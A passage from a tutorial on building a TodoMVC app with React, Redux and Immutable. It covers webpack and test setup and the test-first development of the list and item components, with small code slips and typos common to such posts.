purposefully limited in scope (it\u2019s client-side only, so no isomorphism; a quite simplistic app) in order to keep it somewhat concise. If you want to dig further, I can only recommend the tutorial mentioned above. A companion GitHub repo is available here, which follows the steps to the final app and has a copy of this article. If you have any questions/suggestions on the code and/or the turorial, please leave a comment or \u2013 better yet, open a Pull Request!\nEdit: The article was updated to use the ES2015 syntax for React classes. Thanks to seantimm for pointing that out in the comments!\nThe app\nFor the purpose of this tutorial we will build the classic TodoMVC app. For the record, the requirements are the following:\n\nEach todo can be active or completed\nA todo can be added, edited or deleted\nTodos can be filtered by their status\nA counter of active todos is displayed at the bottom\nCompleted todos can be deleted all at once\n\nYou can see an example of such an app here.\nRedux and Immutable: functional programming to the rescue\nA few months back, I was developing a webapp consisting of dashboards. As the app grew, we noticed more and more pernicious bugs, that were hard to corner and fix. Things like \u201cif you go to this page, click on that button, then go back to the home page, grab a coffee, go to this page and click twice here, something weird happens\u201d. The source of all these bugs was either side effects in our code or logic: an action could have an unwanted impact on something somewhere else in our app, that we were not aware of.\nThat is where the power of Redux lies: the whole state of the app is contained in a single data structure, the state tree. This means that at every moment, what is displayed to the user is the only consequence of what is inside the state tree, which is the single source of truth. Every action in our app takes the state tree, apply the corresponding modifications (add a todo, for example) and outputs the updated state tree, which is then rendered to the user. There is no obscure side effects, no more references to a variable that was inadvertantly modified. This makes for a cleaner separation of concerns, a better app structure and allows for much better debugging.\nImmutable is a helper library developed by Facebook that provides tools to create and manipulate immutable data structures. Although it is by no means mandatory to use it alongside Redux, it enforces the functional approach by forbidding objects modifications. With Immutable, when we want to update an object, we actually create another one with the modifications, and leave the original one as is.\nHere is an example drawn from the docs:\nvar map1 = Immutable.Map({a:1, b:2, c:3});\r\nvar map2 = map1.set('b', 2);\r\nassert(map1 === map2); // no change\r\nvar map3 = map1.set('b', 50);\r\nassert(map1 !== map3); // change\r\n\nWe updated a value of map1, the map1 object in itself remained identical and a new object, map3, was created.\nImmutable will be used to store the state tree of our app, and we will soon see that it provides a lot of simple methods to manipulate it concisely and efficiently.\nSetting up the project\nDisclaimer: a lot of the setting up is inspired by the @teropa tutorial mentionned earlier\nNote: it is recommended to follow this project with a version of NodeJS >= 4.0.0. You can install nvm (node version manager) to be able to switch between Node versions with ease.\nNote: here is the relevant commit in the companion repository.\nIt is now time to setup the project:\nmkdir redux-todomvc\r\ncd redux-todomvc\r\nnpm init -y\r\n\nThe project directory will look like the following:\n\u251c\u2500\u2500 dist\r\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 bundle.js\r\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 index.html\r\n\u251c\u2500\u2500 node_modules\r\n\u251c\u2500\u2500 package.json\r\n\u251c\u2500\u2500 src\r\n\u251c\u2500\u2500 test\r\n\u2514\u2500\u2500 webpack.config.js\r\n\nFirst, we write a simple HTML page in which will run our application:\ndist/index.html\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n  <meta charset=\"UTF-8\">\r\n  <title>React TodoMVC</title>\r\n</head>\r\n<body>\r\n  <div id=\"app\"></div>\r\n  <script src=\"bundle.js\"></script>\r\n</body>\r\n</html>\r\n\nTo go along with it, let\u2019s write a very simple script that will tell us that everything went fine with the packaging:\nsrc/index.js\nconsole.log('Hello World!');\r\n\nWe are going to build the packaged bundle.js file using Webpack. Among the advantages of Webpack feature speed, ease of configuration and most of all hot reload, i.e. the possibility for the webpage to take into account our latest changes without even reloading, meaning the state for the app is kept across (hot) reloads.\nLet\u2019s install webpack:\nnpm install -g --save-dev webpack@1.12.14 webpack-dev-server@1.14.1\r\n\nThe app will be written using the ES2015 syntax, which brings along an impressive set of new features and some nicely integrated syntactic sugar. If you would like to know more about ES2015, this recap is a neat resource.\nBabel will be used to transpile the ES2015 syntax to common JS:\nnpm install --save-dev babel-core@6.5.2 babel-loader@6.2.4 babel-preset-es2015@6.5.0\r\n\nWe are also going to use the JSX syntax to write our React components, so let\u2019s install the Babel React package:\nnpm install --save-dev babel-preset-react@6.5.0\r\n\nHere we configure webpack to build our upcoming source files:\npackage.json\n\"babel\": {\r\n  \"presets\": [\"es2015\", \"react\"]\r\n}\r\n\nwebpack.config.js\nmodule.exports = {\r\n  entry: [\r\n    './src/index.js'\r\n  ],\r\n  module: {\r\n    loaders: [{\r\n      test: /\\.jsx?$/,\r\n      exclude: /node_modules/,\r\n      loader: 'babel'\r\n    }]\r\n  },\r\n  resolve: {\r\n    extensions: ['', '.js', '.jsx']\r\n  },\r\n  output: {\r\n    path: __dirname + '/dist',\r\n    publicPath: '/',\r\n    filename: 'bundle.js'\r\n  },\r\n  devServer: {\r\n    contentBase: './dist'\r\n  }\r\n};\r\n\nNow, let\u2019s add React and React Hot Loader to the project:\nnpm install --save react@0.14.7 react-dom@0.14.7\r\nnpm install --save-dev react-hot-loader@1.3.0\r\n\nIn order to enable the hot loading, a few changes are necessary in the webpack config file:\nwebpack.config.js\nvar webpack = require('webpack'); // Requiring the webpack lib\r\n\r\nmodule.exports = {\r\n  entry: [\r\n    'webpack-dev-server/client?http://localhost:8080', // Setting the URL for the hot reload\r\n    'webpack/hot/only-dev-server', // Reload only the dev server\r\n    './src/index.js'\r\n  ],\r\n  module: {\r\n    loaders: [{\r\n      test: /\\.jsx?$/,\r\n      exclude: /node_modules/,\r\n      loader: 'react-hot!babel' // Include the react-hot loader\r\n    }]\r\n  },\r\n  resolve: {\r\n    extensions: ['', '.js', '.jsx']\r\n  },\r\n  output: {\r\n    path: __dirname + '/dist',\r\n    publicPath: '/',\r\n    filename: 'bundle.js'\r\n  },\r\n  devServer: {\r\n    contentBase: './dist',\r\n    hot: true // Activate hot loading\r\n  },\r\n  plugins: [\r\n    new webpack.HotModuleReplacementPlugin() // Wire in the hot loading plugin\r\n  ]\r\n};\r\n\nSetting up the unit testing framework\nWe will be using Mocha and Chai as our test framework for this app. They are widely used, and the output they produce (a diff comparison of the expected and actual result) is great for doing test-driven-development. Chai-Immutable is a chai plugin that handles immutable data structures.\nnpm install --save immutable@3.7.6\r\nnpm install --save-dev mocha@2.4.5 chai@3.5.0 chai-immutable@1.5.3\r\n\nIn our case we won\u2019t rely on a browser-based test runner like Karma \u2013 instead, the jsdom library will setup a DOM mock in pure javascript and will allow us to run our tests even faster:\nnpm install --save-dev jsdom@8.0.4\r\n\nWe also need to write a bootstrapping script for our tests that takes care of the following:\n\nMock the document and the window objects, normally provided by the browser\nTell chai that we are using immutable data structures with the package chai-immutable\n\ntest/setup.js\nimport jsdom from 'jsdom';\r\nimport chai from 'chai';\r\nimport chaiImmutable from 'chai-immutable';\r\n\r\nconst doc = jsdom.jsdom('<!doctype html><html><body></body></html>');\r\nconst win = doc.defaultView;\r\n\r\nglobal.document = doc;\r\nglobal.window = win;\r\n\r\nObject.keys(window).forEach((key) => {\r\n  if (!(key in global)) {\r\n    global[key] = window[key];\r\n  }\r\n});\r\n\r\nchai.use(chaiImmutable);\r\n\nLet\u2019s update the npm test script so that it takes into account our setup:\npackage.json\n\"scripts\": {\r\n  \"test\": \"mocha --compilers js:babel-core/register --require ./test/setup.js 'test/**/*.@(js|jsx)'\",\r\n  \"test:watch\": \"npm run test -- --watch --watch-extensions jsx\"\r\n},\r\n\nEdit: It seems that the npm run test:watch command does not work on Windows. If you encounter this problem, please refer to this issue in the GitHub repository\nNow, if we run npm run test:watch, all the .js or .jsx file in our test directory will be run as mocha tests each time we update them or our source files.\nThe setup is now complete: we can run webpack-dev-server in a terminal, npm run test:watch in another, and head to localhost:8080/ in a browser to check that Hello World! appears in the console.\nBuilding a state tree\nAs mentionned before, the state tree is the data structure that will hold all\nthe information contained in our application (the state). This structure needs\nto be well thought of before actually developing the app, because it will shape\na lot of the code structure and interactions.\nAs an example here, our app is composed of several items in a todo list:\n\nEach of these items have a text and, for an easier manipulation, an id.\nMoreover, each item can have one of two status \u2013 active or completed:\nLastly, an item can be in a state of edition (when the user wants to edit the\ntext), so we should keep track of that as well:\n\nIt is also possible to filter our items based on their statuses, so we can add a\nfilter entry to obtain our final state tree:\n\nWriting the UI for our app\n\nFirst of all, we are going to split the app into components:\n\nThe TodoHeader component is the input for creating new todos\nThe TodoList component is the list of todos\nThe TodoItem component is one todo\nThe TextInput component is the input for editing a todo\nThe TodoTools component displays the active counter, the filters and the \u201cClear completed\u201d button\nThe Footer component displays the footer info and has no logic attached to it\n\nWe are also going to create a TodoApp component that will hold all the others.\nBootstrapping our first component\nNote: here is the relevant commit in the companion repository.\nAs we saw, we are going to put all of our components in a single one, TodoApp. so let\u2019s begin by attaching this component to the #app div in our index.html:\nsrc/index.jsx\nimport React from 'react';\r\nimport ReactDOM from 'react-dom';\r\nimport {List, Map} from 'immutable';\r\n\r\nimport TodoApp from './components/TodoApp';\r\n\r\nconst todos = List.of(\r\n  Map({id: 1, text: 'React', status: 'active', editing: false}),\r\n  Map({id: 2, text: 'Redux', status: 'active', editing: false}),\r\n  Map({id: 3, text: 'Immutable', status: 'completed', editing: false})\r\n);\r\n\r\nReactDOM.render(\r\n  <TodoApp todos={todos} />,\r\n  document.getElementById('app')\r\n);\r\n\nAs we used the JSX syntax in the index.js file, we have to change its extension to .jsx, and change the file name in the webpack config file as well:\nwebpack.config.js\nentry: [\r\n  'webpack-dev-server/client?http://localhost:8080',\r\n  'webpack/hot/only-dev-server',\r\n  './src/index.jsx' // Change the index file extension\r\n],\r\n\nWriting the todo list UI\nNow, we are going to write a first version of the TodoApp component, that will display the list of todo items:\nsrc/components/TodoApp.jsx\nimport React from 'react';\r\n\r\nexport default class TodoApp extends React.Component {\r\n  getItems() {\r\n    return this.props.todos || [];\r\n  }\r\n  render() {\r\n    return <div>\r\n      <section className=\"todoapp\">\r\n        <section className=\"main\">\r\n          <ul className=\"todo-list\">\r\n            {this.getItems().map(item =>\r\n              <li className=\"active\" key={item.get('text')}>\r\n                <div className=\"view\">\r\n                  <input type=\"checkbox\"\r\n                         className=\"toggle\" />\r\n                  <label htmlFor=\"todo\">\r\n                    {item.get('text')}\r\n                  </label>\r\n                  <button className=\"destroy\"></button>\r\n                </div>\r\n              </li>\r\n            )}\r\n          </ul>\r\n        </section>\r\n      </section>\r\n    </div>\r\n  }\r\n};\r\n\nTwo things come to mind.\nFirst, if you look at the result in your browser, it is not that much appealing. To fix that, we are going to use the todomvc-app-css package that brings along all the styles we need to make this a little more enjoyable:\nnpm install --save todomvc-app-css@2.0.4\r\nnpm install style-loader@0.13.0 css-loader@0.23.1 --save-dev\r\n\nWe need to tell webpack to load css stylesheets too:\nwebpack.config.js\n// ...\r\nmodule: {\r\n  loaders: [{\r\n    test: /\\.jsx?$/,\r\n    exclude: /node_modules/,\r\n    loader: 'react-hot!babel'\r\n  }, {\r\n    test: /\\.css$/,\r\n    loader: 'style!css' // We add the css loader\r\n  }]\r\n},\r\n//...\r\n\nThen we will include the style in our index.jsx file:\nsrc/index.jsx\n// ...\r\nrequire('../node_modules/todomvc-app-css/index.css');\r\n\r\nReactDOM.render(\r\n  <TodoApp todos={todos} />,\r\n  document.getElementById('app')\r\n);\r\n\nThe second thing is that the code seems complicated: it is. That is why we are going to create two more components: TodoList and TodoItem that will take care of respectively the list of all the items and a single one.\nNote: here is the relevant commit in the companion repository.\nsrc/components/TodoApp.jsx\nimport React from 'react';\r\nimport TodoList from './TodoList'\r\n\r\nexport default class TodoApp extends React.Component {\r\n  render() {\r\n    return <div>\r\n      <section className=\"todoapp\">\r\n        <TodoList todos={this.props.todos} />\r\n      </section>\r\n    </div>\r\n  }\r\n};\r\n\nThe TodoList component will display a TodoItem component for each item it has received in its props:\nsrc/components/TodoList.jsx\nimport React from 'react';\r\nimport TodoItem from './TodoItem';\r\n\r\nexport default class TodoList extends React.Component {\r\n  render() {\r\n    return <section className=\"main\">\r\n      <ul className=\"todo-list\">\r\n        {this.props.todos.map(item =>\r\n          <TodoItem key={item.get('text')}\r\n                    text={item.get('text')} />\r\n        )}\r\n      </ul>\r\n    </section>\r\n  }\r\n};\r\n\nsrc/components/TodoItem.jsx\nimport React from 'react';\r\n\r\nexport default class TodoItem extends React.Component {\r\n  render() {\r\n    return <li className=\"todo\">\r\n      <div className=\"view\">\r\n        <input type=\"checkbox\"\r\n               className=\"toggle\" />\r\n        <label htmlFor=\"todo\">\r\n          {this.props.text}\r\n        </label>\r\n        <button className=\"destroy\"></button>\r\n      </div>\r\n    </li>\r\n  }\r\n};\r\n\nBefore going more deeply into possible user actions and how we are going to integrate them in the app, let\u2019s add an input in the TodoItem component for editing:\nsrc/components/TodoItem.jsx\nimport React from 'react';\r\n\r\nimport TextInput from './TextInput';\r\n\r\nexport default class TodoItem extends React.Component {\r\n\r\n  render() {\r\n    return <li className=\"todo\">\r\n      <div className=\"view\">\r\n        <input type=\"checkbox\"\r\n               className=\"toggle\" />\r\n        <label htmlFor=\"todo\">\r\n          {this.props.text}\r\n        </label>\r\n        <button className=\"destroy\"></button>\r\n      </div>\r\n      <TextInput /> // We add the TextInput component\r\n    </li>\r\n  }\r\n};\r\n\nThe TextInput component can be written as follows:\nsrc/components/TextInput.jsx\nimport React from 'react';\r\n\r\nexport default class TextInput extends React.Component {\r\n  render() {\r\n    return <input className=\"edit\"\r\n                  autoFocus={true}\r\n                  type=\"text\" />\r\n  }\r\n};\r\n\nThe benefits of \u201cpure\u201d components: the PureRenderMixin\nNote: here is the relevant commit in the companion repository.\nApart for allowing a functional programming style, the fact that our UI is purely dependant on props allows us to use the PureRenderMixin for a performance boost, as per the React docs:\n\u201cIf your React component\u2019s render function is \u201cpure\u201d (in other words, it renders the same result given the same props and state), you can use this mixin for a performance boost in some cases.\u201d\nIt is quite easy to add it to our child components, as shown in the React documentation (we will see in part two that the TodoApp component has some extra role that prevents the use of the PureRenderMixin):\nnpm install --save react-addons-pure-render-mixin@0.14.7\r\n\nsrc/components/TodoList.jsx\nimport React from 'react';\r\nimport PureRenderMixin from 'react-addons-pure-render-mixin'\r\nimport TodoItem from './TodoItem';\r\n\r\nexport default class TodoList extends React.Component {\r\n  constructor(props) {\r\n    super(props);\r\n    this.shouldComponentUpdate = PureRenderMixin.shouldComponentUpdate.bind(this);\r\n  }\r\n  render() {\r\n    // ...\r\n  }\r\n};\r\n\nsrc/components/TodoItem.jsx\nimport React from 'react';\r\nimport PureRenderMixin from 'react-addons-pure-render-mixin'\r\nimport TextInput from './TextInput';\r\n\r\nexport default class TodoItem extends React.Component {\r\n  constructor(props) {\r\n    super(props);\r\n    this.shouldComponentUpdate = PureRenderMixin.shouldComponentUpdate.bind(this);\r\n  }\r\n  render() {\r\n    // ...\r\n  }\r\n};\r\n\nsrc/components/TextInput.jsx\nimport React from 'react';\r\nimport PureRenderMixin from 'react-addons-pure-render-mixin'\r\n\r\nexport default class TextInput extends React.Component {\r\n  constructor(props) {\r\n    super(props);\r\n    this.shouldComponentUpdate = PureRenderMixin.shouldComponentUpdate.bind(this);\r\n  }\r\n  render() {\r\n    // ...\r\n  }\r\n};\r\n\nHandling user actions in the list components\nOkay, so now we have our UI set up for the list components. However, none of what we have written yet takes into account user actions and how the app responds to them.\nThe power of props\nIn React, the props object is passed by settings attributes when we instantiate a container. For example, if we instantiate a TodoItem element this way:\n<TodoItem text={'Text of the item'} />\r\n\nThen we can access, in the TodoItem component, the this.props.text variable:\n// in TodoItem.jsx\r\nconsole.log(this.props.text);\r\n// outputs 'Text of the item'\r\n\nThe Redux architecture makes an intensive use of props. The basic principle is that (nearly) every element\u2019s state should be residing only in its props. To put it another way: for the same set of props, two instances of an element should output the exact same result. As we saw before, the entire state of the app is contained in the state tree: this means that the state tree, passed down to components as props, will entirely and predictably determine the app\u2019s visual output.\nThe TodoList component\nNote: here is the relevant commit in the companion repository.\nIn this section and the following, we are going to follow a test-first approach.\nIn order to help up test our components, the React library provides the TestUtils addons that provide, among others, the following methods:\n\nrenderIntoDocument, that renders a component into a detached DOM node;\nscryRenderedDOMComponentsWithTag, that finds all instances of components in the DOM with the provided tag (like li, input\u2026);\nscryRenderedDOMComponentsWithClass, that finds all instances of components in the DOM with the provided class;\nSimulate, that simulates user actions (a click, a key press, text inputs\u2026)\n\nThe TestUtils addon is not included in the react package, so we have to install it separately:\nnpm install --save-dev react-addons-test-utils@0.14.7\r\n\nOur first test will ensure that the TodoList components displays all the active items in the list it has been given if the filter props has been set to active:\ntest/components/TodoList_spec.jsx\nimport React from 'react';\r\nimport TestUtils from 'react-addons-test-utils';\r\nimport TodoList from '../../src/components/TodoList';\r\nimport {expect} from 'chai';\r\nimport {List, Map} from 'immutable';\r\n\r\nconst {renderIntoDocument,\r\n       scryRenderedDOMComponentsWithTag} = TestUtils;\r\n\r\ndescribe('TodoList', () => {\r\n  it('renders a list with only the active items if the filter is active', () => {\r\n    const todos = List.of(\r\n      Map({id: 1, text: 'React', status: 'active'}),\r\n      Map({id: 2, text: 'Redux', status: 'active'}),\r\n      Map({id: 3, text: 'Immutable', status: 'completed'})\r\n    );\r\n    const filter = 'active';\r\n    const component = renderIntoDocument(\r\n      <TodoList filter={filter} todos={todos} />\r\n    );\r\n    const items = scryRenderedDOMComponentsWithTag(component, 'li');\r\n\r\n    expect(items.length).to.equal(2);\r\n    expect(items[0].textContent).to.contain('React');\r\n    expect(items[1].textContent).to.contain('Redux');\r\n  });\r\n});\r\n\nWe can see that our test is failing: instead of the two active items we want to have displayed, there are three. That is perfectly normal, as we haven\u2019t yet wrote the logic to actually filter the items:\nsrc/components/TodoList.jsx\n// ...\r\nexport default class TodoList extends React.Component {\r\n  // Filters the items according to their status\r\n  getItems() {\r\n    if (this.props.todos) {\r\n      return this.props.todos.filter(\r\n        (item) => item.get('status') === this.props.filter\r\n      );\r\n    }\r\n    return [];\r\n  }\r\n  render() {\r\n    return <section className=\"main\">\r\n      <ul className=\"todo-list\">\r\n        // Only the filtered items are displayed\r\n        {this.getItems().map(item =>\r\n          <TodoItem key={item.get('text')}\r\n                    text={item.get('text')} />\r\n        )}\r\n      </ul>\r\n    </section>\r\n  }\r\n};\r\n\nOur first test passes! Let\u2019s not stop there and add the tests for the filters all and completed:\ntest/components/TodoList_spec.js\n// ...\r\ndescribe('TodoList', () => {\r\n  // ...\r\n  it('renders a list with only completed items if the filter is completed', () => {\r\n    const todos = List.of(\r\n      Map({id: 1, text: 'React', status: 'active'}),\r\n      Map({id: 2, text: 'Redux', status: 'active'}),\r\n      Map({id: 3, text: 'Immutable', status: 'completed'})\r\n    );\r\n    const filter = 'completed';\r\n    const component = renderIntoDocument(\r\n      <TodoList filter={filter} todos={todos} />\r\n    );\r\n    const items = scryRenderedDOMComponentsWithTag(component, 'li');\r\n\r\n    expect(items.length).to.equal(1);\r\n    expect(items[0].textContent).to.contain('Immutable');\r\n  });\r\n\r\n  it('renders a list with all the items', () => {\r\n    const todos = List.of(\r\n      Map({id: 1, text: 'React', status: 'active'}),\r\n      Map({id: 2, text: 'Redux', status: 'active'}),\r\n      Map({id: 3, text: 'Immutable', status: 'completed'})\r\n    );\r\n    const filter = 'all';\r\n    const component = renderIntoDocument(\r\n      <TodoList filter={filter} todos={todos} />\r\n    );\r\n    const items = scryRenderedDOMComponentsWithTag(component, 'li');\r\n\r\n    expect(items.length).to.equal(3);\r\n    expect(items[0].textContent).to.contain('React');\r\n    expect(items[1].textContent).to.contain('Redux');\r\n    expect(items[2].textContent).to.contain('Immutable');\r\n  });\r\n});\r\n\nThe third test is failing, as the logic for the all filter is sligthly different \u2013 let\u2019s update the component logic:\nsrc/components/TodoList.jsx\n// ...\r\nexport default React.Component {\r\n  // Filters the items according to their status\r\n  getItems() {\r\n    if (this.props.todos) {\r\n      return this.props.todos.filter(\r\n        (item) => this.props.filter === 'all' || item.get('status') === this.props.filter\r\n      );\r\n    }\r\n    return [];\r\n  }\r\n  // ...\r\n});\r\n\nAt this time, we know that the items that are displayed on the app are filtered by the filter property. Indeed, if we look at the app in the browser, we see that no items are displayed as we haven\u2019t yet set it:\nsrc/index.jsx\n// ...\r\nconst todos = List.of(\r\n  Map({id: 1, text: 'React', status: 'active', editing: false}),\r\n  Map({id: 2, text: 'Redux', status: 'active', editing: false}),\r\n  Map({id: 3, text: 'Immutable', status: 'completed', editing: false})\r\n);\r\n\r\nconst filter = 'all';\r\n\r\nrequire('../node_modules/todomvc-app-css/index.css')\r\n\r\nReactDOM.render(\r\n  <TodoApp todos={todos} filter = {filter}/>,\r\n  document.getElementById('app')\r\n);\r\n\nsrc/components/TodoApp.jsx\n// ...\r\nexport default class TodoApp extends React.Component {\r\n  render() {\r\n    return <div>\r\n      <section className=\"todoapp\">\r\n        // We pass the filter props down to the TodoList component\r\n        <TodoList todos={this.props.todos} filter={this.props.filter}/>\r\n      </section>\r\n    </div>\r\n  }\r\n};\r\n\nOur items have now reappeared, and are filtered with the filter constant we have declared in the index.jsx file.\nThe TodoItem component\nNote: here is the relevant commit in the companion repository.\nNow, let\u2019s take care of the TodoItem component. First of all, we want to make sure that the TodoItem component indeed renders an item. We also want to test the as yet unimplemented feature that when an item is completed, it is stricken-through:\ntest/components/TodoItem_spec.js\nimport React from 'react';\r\nimport TestUtils from 'react-addons-test-utils';\r\nimport TodoItem from '../../src/components/TodoItem';\r\nimport {expect} from 'chai';\r\n\r\nconst {renderIntoDocument,\r\n       scryRenderedDOMComponentsWithTag} = TestUtils;\r\n\r\ndescribe('TodoItem', () => {\r\n  it('renders an item', () => {\r\n    const text = 'React';\r\n    const component = renderIntoDocument(\r\n      <TodoItem text={text} />\r\n    );\r\n    const todo = scryRenderedDOMComponentsWithTag(component, 'li');\r\n\r\n    expect(todo.length).to.equal(1);\r\n    expect(todo[0].textContent).to.contain('React');\r\n  });\r\n\r\n  it('strikes through the item if it is completed', () => {\r\n    const text = 'React';\r\n    const component = renderIntoDocument(\r\n      <TodoItem text={text} isCompleted={true}/>\r\n    );\r\n    const todo = scryRenderedDOMComponentsWithTag(component, 'li');\r\n\r\n    expect(todo[0].classList.contains('completed')).to.equal(true);\r\n  });\r\n});\r\n\nTo make the second test pass, we should apply the class completed to the item if the status, which will be passed down as props, is set to completed. We will use the classnames package to manipulate our DOM classes when they get a little complicated:\nnpm install --save classnames\r\n\nsrc/components/TodoItem.jsx\nimport React from 'react';\r\n// We need to import the classNames object\r\nimport classNames from 'classnames';\r\n\r\nimport TextInput from './TextInput';\r\n\r\nexport default class TodoItem extends React.Component {\r\n  render() {\r\n    var itemClass = classNames({\r\n      'todo': true,\r\n      'completed': this.props.isCompleted\r\n    });\r\n    return <li className={itemClass}>\r\n      // ...\r\n    </li>\r\n  }\r\n};\r\n\nAn item should also have a particular look when it is being edited, a fact that is encapsulated by the isEditing prop:\ntest/components/TodoItem_spec.js\n// ...\r\ndescribe('TodoItem', () => {\r\n  //...\r\n\r\n  it('should look different when editing', () => {\r\n    const text = 'React';\r\n    const component = renderIntoDocument(\r\n      <TodoItem text={text} isEditing={true}/>\r\n    );\r\n    const todo = scryRenderedDOMComponentsWithTag(component, 'li');\r\n\r\n    expect(todo[0].classList.contains('editing')).to.equal(true);\r\n  });\r\n});\r\n\nIn order to make the test pass, we only need to update the itemClass object:\nsrc/components/TodoItem.jsx\n// ...\r\nexport default class TodoItem extends React.Component {\r\n  render() {\r\n    var itemClass = classNames({\r\n      'todo': true,\r\n      'completed': this.props.isCompleted,\r\n      'editing': this.props.isEditing\r\n    });\r\n    return <li className={itemClass}>\r\n      // ...\r\n    </li>\r\n  }\r\n};\r\n\nThe checkbox at the left of the item should be ckecked if the item is completed:\ntest/components/TodoItem_spec.js\n// ...\r\ndescribe('TodoItem', () => {\r\n  //...\r\n\r\n  it('should be checked if the item is completed', () => {\r\n    const text = 'React';\r\n    const text2 = 'Redux';\r\n    const component = renderIntoDocument(\r\n      <TodoItem text={text} isCompleted={true}/>,\r\n      <TodoItem text={text2} isCompleted={false}/>\r\n    );\r\n    const input = scryRenderedDOMComponentsWithTag(component, 'input');\r\n    expect(input[0].checked).to.equal(true);\r\n    expect(input[1].checked).to.equal(false);\r\n  });\r\n});\r\n\nReact has a method to set the state of a checkbox input: defaultChecked.\nsrc/components/TodoItem.jsx\n// ...\r\nexport default class TodoItem extends React.Component {\r\n  render() {\r\n    // ...\r\n    return <li className={itemClass}>\r\n      <div className=\"view\">\r\n        <input type=\"checkbox\"\r\n               className=\"toggle\"\r\n               defaultChecked={this.props.isCompleted}/>\r\n        // ...\r\n      </div>\r\n    </li>\r\n  }\r\n};\r\n\nWe also have to pass down the isCompleted and isEditing props down from the TodoList component:\nsrc/components/TodoList.jsx\n// ...\r\nexport default class TodoList extends React.Component {\r\n  // ...\r\n  // This function checks whether an item is completed\r\n  isCompleted(item) {\r\n    return item.get('status') === 'completed';\r\n  }\r\n  render() {\r\n    return <section className=\"main\">\r\n      <ul className=\"todo-list\">\r\n        {this.getItems().map(item =>\r\n          <TodoItem key={item.get('text')}\r\n                    text={item.get('text')}\r\n                    // We pass down the info on completion and editing\r\n                    isCompleted={this.isCompleted(item)}\r\n                    isEditing={item.get('editing')} />\r\n        )}\r\n      </ul>\r\n    </section>\r\n  }\r\n};\r\n\nFor now, we are able to reflect the state of our app in the components: for\nexample, a completed item will be stricken. However, a webapp also handles user\nactions, such as clicking on a button. In the Redux model, this is also\nprocessed using props, and more specifically by passing callbacks as props.\nBy doing so, we separate once again the UI from the logic of the app: the\ncomponent need not knowing what particular action will derive from a click \u2013\nonly that the click will trigger something.\nTo illustrate this principle, we are going to test that if the user clicks on\nthe delete button (the red cross), the deleteItem function is called:\nNote: here is the relevant commit in the companion repository.\ntest/components/TodoItem_spec.jsx\n// ...\r\n// The Simulate helper allows us to simulate a user clicking\r\nconst {renderIntoDocument,\r\n       scryRenderedDOMComponentsWithTag,\r\n       Simulate} = TestUtils;\r\n\r\ndescribe('TodoItem', () => {\r\n  // ...\r\n  it('invokes callback when the delete button is clicked', () => {\r\n    const text = 'React';\r\n    var deleted = false;\r\n    // We define a mock deleteItem function\r\n    const deleteItem = () => deleted = true;\r\n    const component = renderIntoDocument(\r\n      <TodoItem text={text} deleteItem={deleteItem}/>\r\n    );\r\n    const buttons = scryRenderedDOMComponentsWithTag(component, 'button');\r\n    Simulate.click(buttons[0]);\r\n\r\n    // We verify that the deleteItem function has been called\r\n    expect(deleted).to.equal(true);\r\n  });\r\n});\r\n\nTo make this test pass, we must declare an onClick handler on the delete\nbutton that will call the deleteItem function passed in the props:\nsrc/components/TodoItem.jsx\n// ...\r\nexport default class TodoItem extends React.Component {\r\n  render() {\r\n    // ...\r\n    return <li className={itemClass}>\r\n      <div className=\"view\">\r\n        // ...\r\n        // The onClick handler will call the deleteItem function given in the props\r\n        <button className=\"destroy\"\r\n                onClick={() => this.props.deleteItem(this.props.id)}></button>\r\n      </div>\r\n      <TextInput />\r\n    </li>\r\n  }\r\n};\r\n\nIt is important to note that the actual logic for deleting the item has not been\nimplemented yet: that will be the role of Redux.\nOn the same model, we can test and imlement the following features:\n\nA click on the checkbox should call the toggleComplete callback\nA double click on the item label should call the editItem callback\n\ntest/components/TodoItem_spec.js\n// ...\r\ndescribe('TodoItem', () => {\r\n  // ...\r\n  it('invokes callback when checkbox is clicked', () => {\r\n    const text = 'React';\r\n    var isChecked = false;\r\n    const toggleComplete = () => isChecked = true;\r\n    const component = renderIntoDocument(\r\n      <TodoItem text={text} toggleComplete={toggleComplete}/>\r\n    );\r\n    const checkboxes = scryRenderedDOMComponentsWithTag(component, 'input');\r\n    Simulate.click(checkboxes[0]);\r\n\r\n    expect(isChecked).to.equal(true);\r\n  });\r\n\r\n  it('calls a callback when text is double clicked', () => {\r\n    var text = 'React';\r\n    const editItem = () => text = 'Redux';\r\n    const component = renderIntoDocument(\r\n      <TodoItem text={text} editItem={editItem}/>\r\n    );\r\n    const label = component.refs.text\r\n    Simulate.doubleClick(label);\r\n\r\n    expect(text).to.equal('Redux');\r\n  });\r\n});\r\n\nsrc/components/TodoItem.jsx\n// ...\r\nrender() {\r\n  // ...\r\n  return <li className={itemClass}>\r\n    <div className=\"view\">\r\n      // We add an onClick handler on the checkbox\r\n      <input type=\"checkbox\"\r\n             className=\"toggle\"\r\n             defaultChecked={this.props.isCompleted}\r\n             onClick={() => this.props.toggleComplete(this.props.id)}/>\r\n      // We add a ref attribute to the label to facilitate the testing\r\n      // The onDoubleClick handler is unsurprisingly called on double clicks\r\n      <label htmlFor=\"todo\"\r\n             ref=\"text\"\r\n             onDoubleClick={() => this.props.editItem(this.props.id)}>\r\n        {this.props.text}\r\n      </label>\r\n      <button className=\"destroy\"\r\n              onClick={() => this.props.deleteItem(this.props.id)}></button>\r\n    </div>\r\n    <TextInput />\r\n  </li>\r\n\nWe also have to pass down the editItem, deleteItem and toggleComplete functions as props down from the TodoList component:\nsrc/components/TodoList.jsx\n// ...\r\nexport default class TodoList extends React.Component {\r\n  // ...\r\n  render() {\r\n      return <section className=\"main\">\r\n        <ul className=\"todo-list\">\r\n          {this.getItems().map(item =>\r\n            <TodoItem key={item.get('text')}\r\n                      text={item.get('text')}\r\n                      id={item.get('id')}\r\n                      isCompleted={this.isCompleted(item)}\r\n                      isEditing={item.get('editing')}\r\n                      // We pass down the callback functions\r\n                      toggleComplete={this.props.toggleComplete}\r\n                      deleteItem={this.props.deleteItem}\r\n                      editItem={this.props.editItem}/>\r\n          )}\r\n        </ul>\r\n      </section>\r\n    }\r\n};\r\n\nSetting up the other components\nNow that you are a little more familiar with the process, and in order to keep\nthe length of this article in reasonable constraints I invite you to have a look\nat the companion repository for the code responsible for the TextInput (relevant commit), TodoHeader (relevant commit) and TodoTools and Footer (relevant commit) components. If you have any question about those components please leave a comment here, or an issue on the repo!\nYou may notice that some functions, such as editItem, toggleComplete and the like, have not yet been defined. They will be in the next part of this tutorial as Redux actions, so do not worry yet if your console start throwing some errors about 